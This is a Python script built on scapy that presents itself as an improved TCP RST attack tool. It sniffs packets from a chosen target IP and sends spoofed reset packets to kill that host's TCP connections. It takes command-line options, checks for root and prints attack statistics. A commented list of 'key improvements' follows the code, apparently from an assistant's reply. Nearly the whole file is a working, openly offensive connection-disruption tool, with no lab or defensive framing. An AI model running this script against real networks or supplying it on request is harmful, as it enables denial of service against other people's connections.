#!/usr/bin/env python3
"""
Improved TCP RST Attack Script
Automatically sends RST packets to terminate TCP connections
"""

from scapy.all import *
import argparse
import sys
import signal
import time

class TCPRSTAttacker:
    def __init__(self, target_ip, interface=None, verbose=False):
        self.target_ip = target_ip
        self.interface = interface
        self.verbose = verbose
        self.packet_count = 0
        self.start_time = time.time()
        
    def spoof_tcp_rst(self, pkt):
        """
        Craft and send a TCP RST packet to terminate the connection
        """
        try:
            # Extract original packet information
            orig_src_ip = pkt[IP].src
            orig_dst_ip = pkt[IP].dst
            orig_src_port = pkt[TCP].sport
            orig_dst_port = pkt[TCP].dport
            orig_seq = pkt[TCP].seq
            orig_ack = pkt[TCP].ack
            
            # Create spoofed RST packet (swap src/dst)
            ip_layer = IP(dst=orig_src_ip, src=orig_dst_ip)
            tcp_layer = TCP(
                flags="R",           # RST flag
                seq=orig_ack,        # Use original ACK as our SEQ
                dport=orig_src_port, # Swap ports
                sport=orig_dst_port
            )
            
            rst_packet = ip_layer / tcp_layer
            
            # Send the RST packet
            send(rst_packet, verbose=0, iface=self.interface)
            
            self.packet_count += 1
            
            if self.verbose:
                print(f"[{self.packet_count}] RST sent: {orig_dst_ip}:{orig_dst_port} -> {orig_src_ip}:{orig_src_port}")
                print(f"    Original: SEQ={orig_seq}, ACK={orig_ack}")
                print(f"    RST: SEQ={orig_ack}")
                
        except Exception as e:
            print(f"Error crafting RST packet: {e}")
    
    def start_attack(self):
        """
        Start the TCP RST attack
        """
        print(f"Starting TCP RST attack on {self.target_ip}")
        print(f"Interface: {self.interface or 'default'}")
        print("Press Ctrl+C to stop...\n")
        
        # Create packet filter
        packet_filter = f"tcp and src host {self.target_ip}"
        
        try:
            # Start packet sniffing
            sniff(
                filter=packet_filter,
                prn=self.spoof_tcp_rst,
                iface=self.interface,
                store=0  # Don't store packets in memory
            )
        except KeyboardInterrupt:
            self.stop_attack()
        except Exception as e:
            print(f"Error during packet sniffing: {e}")
    
    def stop_attack(self):
        """
        Stop the attack and show statistics
        """
        duration = time.time() - self.start_time
        print(f"\n--- Attack Statistics ---")
        print(f"Duration: {duration:.2f} seconds")
        print(f"RST packets sent: {self.packet_count}")
        print(f"Rate: {self.packet_count/duration:.2f} packets/second")
        sys.exit(0)

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    print("\nAttack interrupted by user")
    sys.exit(0)

def main():
    parser = argparse.ArgumentParser(description="TCP RST Attack Tool")
    parser.add_argument("target_ip", help="Target IP address to attack")
    parser.add_argument("-i", "--interface", help="Network interface to use")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("--filter", help="Additional packet filter")
    
    args = parser.parse_args()
    
    # Check if running as root
    if os.geteuid() != 0:
        print("Error: This script requires root privileges")
        print("Run with: sudo python3 auto_rst_improved.py <target_ip>")
        sys.exit(1)
    
    # Set up signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    # Create and start attacker
    attacker = TCPRSTAttacker(
        target_ip=args.target_ip,
        interface=args.interface,
        verbose=args.verbose
    )
    
    attacker.start_attack()

if __name__ == "__main__":
    main()
# ```

# ## Key Improvements

# 1. **Object-Oriented Design**: Organized code into a class for better structure
# 2. **Command-Line Interface**: Added argument parsing for flexibility
# 3. **Error Handling**: Added try-catch blocks for robust operation
# 4. **Statistics**: Tracks and displays attack statistics
# 5. **Verbose Mode**: Optional detailed output for debugging
# 6. **Root Check**: Verifies script is run with necessary privileges
# 7. **Graceful Shutdown**: Handles Ctrl+C interruption cleanly
# 8. **Interface Selection**: Allows specifying network interface
# 9. **Better Documentation**: Added comments and docstrings
# 10. **Memory Efficiency**: Uses `store=0` to prevent memory buildup

# ## Usage Examples
